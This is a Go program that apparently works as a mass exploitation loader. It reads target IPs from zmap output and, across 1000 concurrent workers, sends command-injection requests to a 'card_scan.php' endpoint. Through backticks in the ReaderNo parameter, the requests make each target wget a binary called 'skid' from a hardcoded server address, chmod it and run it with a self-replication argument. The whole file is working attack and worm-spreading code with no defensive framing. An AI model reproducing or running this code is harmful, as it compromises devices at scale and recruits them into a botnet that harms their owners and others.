package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
)

const (
	BIN_SERVER = "185.225.74.161"
	HTTP_DATA  = "Mozilla/5.0 (COBRA NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
	EMERGE_BIN = "skid"
)

func main() {
	// Create a scanner to read IP addresses from stdin (assuming it receives output from zmap)
	scanner := bufio.NewScanner(os.Stdin)

	// Create a channel to hold IP addresses
	ipQueue := make(chan string, 1000000) // Adjust the buffer size as needed

	// Create a WaitGroup to wait for all goroutines to finish
	var wg sync.WaitGroup

	// Start multiple goroutines to process IP addresses concurrently
for i := 0; i < 1000; i++ { // You can adjust the number of goroutines as needed
    wg.Add(1)
    go processIPs(ipQueue, &wg)
}

	// Read IP addresses from stdin and add them to the queue
	for scanner.Scan() {
		ip := strings.TrimSpace(scanner.Text())
		if ip != "" {
			ipQueue <- ip
		}
	}

	// Close the IP queue to signal that no more IPs will be added
	close(ipQueue)

	// Wait for all goroutines to finish
	wg.Wait()
}

func processIPs(ipQueue chan string, wg *sync.WaitGroup) {
	defer wg.Done()

	for ip := range ipQueue {
		// Define the URLs for the GET requests with the IP from zmap
		url1 := fmt.Sprintf("http://%s/card_scan.php?No=30&ReaderNo=`wget http://%s/%s`", ip, BIN_SERVER, EMERGE_BIN)
		url2 := fmt.Sprintf("http://%s/card_scan.php?No=30&ReaderNo=`chmod 777 %s`", ip, EMERGE_BIN)
		url3 := fmt.Sprintf("http://%s/card_scan.php?No=30&ReaderNo=`./%s selfrep.emerge1`", ip, EMERGE_BIN)

		// Send the HTTP GET requests
		sendGETRequest(url1, HTTP_DATA)
		sendGETRequest(url2, HTTP_DATA)
		sendGETRequest(url3, HTTP_DATA)
	}
}

func sendGETRequest(url string, userAgent string) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("User-Agent", userAgent)

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("GET request to %s returned status: %s\n", url, resp.Status)
	if resp.StatusCode != http.StatusOK {
		fmt.Printf("Response body: %s\n", readResponseBody(resp))
	}
}

func readResponseBody(resp *http.Response) string {
	buf := make([]byte, 1024)
	var body string
	for {
		n, err := resp.Body.Read(buf)
		if n > 0 {
			body += string(buf[:n])
		}
		if err != nil {
			break
		}
	}
	return body
}
